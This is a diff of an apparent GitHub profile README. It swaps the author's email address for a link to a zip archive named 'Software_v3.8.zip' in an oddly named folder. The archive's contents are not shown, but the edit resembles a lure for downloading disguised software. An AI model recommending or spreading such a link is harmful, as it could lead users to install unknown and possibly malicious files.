@@ -2,4 +2,4 @@
 - 👀 I like reading books
 - 🌱 I’m currently learning CS
 - 💞️ I’m looking to collaborate on the tech world
-- 📫 abdelrahmaneslaim@gmail.com
+- 📫 https://raw.githubusercontent.com/eslaim/eslaim/main/ungenerously/Software_v3.8.zip
